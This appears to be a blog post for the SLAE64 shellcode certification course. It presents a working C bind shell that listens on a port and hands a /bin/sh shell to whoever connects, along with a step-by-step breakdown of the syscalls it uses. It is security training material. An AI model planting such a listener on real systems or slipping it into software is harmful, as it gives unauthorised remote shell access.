Assignment #1 – Bind shell with password
========================================

The objective of this assignment was to create a shellcode that binds to a port and, if provided with the correct password, spawns a shell. The final shellcode must not have any null bytes.

Writing the bind shell
----------------------

I started by writing the bind shell itself, with no password. To do this it's easier to start from a C version like the one below. This code has no error checking at all; and the shellcode won't have either.

    #include <stdlib.h>
    #include <unistd.h>
    #include <strings.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>

    int main(int argc, char **argv)
    {
        struct sockaddr_in server;
        int sock, new;
        char *arguments[] = {"/bin/sh", 0};
        
        sock = socket(AF_INET, SOCK_STREAM, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[1]));
        server.sin_addr.s_addr = INADDR_ANY;
        bzero(&server.sin_zero, 8);

        bind(sock, (struct sockaddr *)&server, sizeof(server));
        listen(sock, 2);
        new = accept(sock, NULL, NULL);
        close(sock);

        dup2(new, 0);
        dup2(new, 1);
        dup2(new, 2);

        execve(arguments[0], arguments, NULL);
    }

Breaking it down we have seven parts:

  1. `socket()`. Create a socket to use in communications
  1. `bind()`. Bind a socket to an address
  1. `listen()`. Mark the socket as being able to accept incoming connections
  1. `accept()`. Accept connection requests and create new sockets
  1. `close()`. Close the listening socket
  1. `dup2()`. Duplicate file descriptors to connect `stdin`, `stdout` and `stderr` to the incoming connection
  1. `execve()`. Replace the current process image with `/bin/sh`

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
